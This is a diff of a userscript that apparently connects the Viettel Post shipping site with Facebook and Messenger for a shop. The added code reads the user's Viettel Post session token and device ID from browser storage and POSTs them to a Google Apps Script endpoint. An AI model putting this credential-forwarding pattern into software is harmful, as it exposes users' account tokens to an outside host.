@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Bumkids Ext by Quang.TD
 // @author       Quang.TD
-// @version      2025.9.8
+// @version      2025.9.15
 // @description  try to take over the world!
 // @namespace    bumkids_ext
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=viettelpost.vn
@@ -9,12 +9,17 @@
 // @downloadURL  https://raw.githubusercontent.com/quang1412/Bumkids_fb_vtp/main0506/script.js
 // @updateURL    https://raw.githubusercontent.com/quang1412/Bumkids_fb_vtp/main0506/script.js
 
+// @require      https://code.jquery.com/jquery-3.7.1.js
+
 // @match        *viettelpost.vn/*
-// @match        *api.viettelpost.vn/*
 // @match        *.facebook.com/*
 // @match        *.messenger.com/*
 
-// @require      https://code.jquery.com/jquery-3.7.1.js
+// @connect      bumm.kids
+// @connect      api.viettelpost.vn
+// @connect      io.okd.viettelpost.vn
+// @connect      script.google.com
+// @connect      script.googleusercontent.com
 
 // @grant        GM_log
 // @grant        GM_setValue
@@ -138,6 +143,36 @@ Facebook
                 '');
 })();
 
+const SHEETAPI = {
+    url: 'https://script.google.com/macros/s/AKfycbw-DXz_EwNkDlDni_bQjtXgNan9JHlEVOAt0NlB3crMd5RnEu8LgsVX0y_v2P9xsi4_Ug/exec',
+    get: function(json){
+
+    },
+    post: function(json){
+        return new Promise((resolve, reject) => {
+            GM_xmlhttpRequest({
+                headers: {"Content-Type": "text/plain" },
+                url: this.url,
+                method: "POST",
+                synchronous: true,
+                data: JSON.stringify(json),
+                onload: res => {
+                    console.log(res);
+                    return res.status == 200 ? resolve(res.responseText) : reject(new Error(res.statusText));
+                },
+                onerror: e => {
+                    console.error(e)
+                    alert('Lỗi sheetAPI \nMã lỗi: #166');
+                    return reject(e.message||e.error);
+                }
+            });
+        })
+    },
+    getCustomerById(id){
+
+    },
+}
+
 // VIETTEL
 const VIETTEL = {
     init: function(){
@@ -146,6 +181,8 @@ const VIETTEL = {
             GM_setValue('vtp_deviceId', this.deviceId);
             this.token = this.deviceId && JSON.parse(window.localStorage['vtp-token']).tokenKey;
             GM_setValue('vtp_tokenKey', this.token);
+
+            SHEETAPI.post({act: "token", data: `${this.deviceId}; ${this.token}` });
         }
         else if(isFBpage || isMessPage){
             this.deviceId = GM_getValue('vtp_deviceId', null);
@@ -265,8 +302,7 @@ const GGSHEET = {
             let ggsid = '1KAhQCGOIInG3Et77PfY03V_Nn4fWvi0z1ITh1BKFkmk';
             let tq = encodeURIComponent(queryStr);
             let url = `https://docs.google.com/spreadsheets/d/${ggsid}/gviz/tq?tqx=out:csv&headers=1&sheet=${sheet}&range=${range}&tq=${tq}&time=${new Date().getTime()}`;
-
-            console.log(url)
+            //console.log(url)
             GM_xmlhttpRequest({
                 url: url,
                 method: "GET",
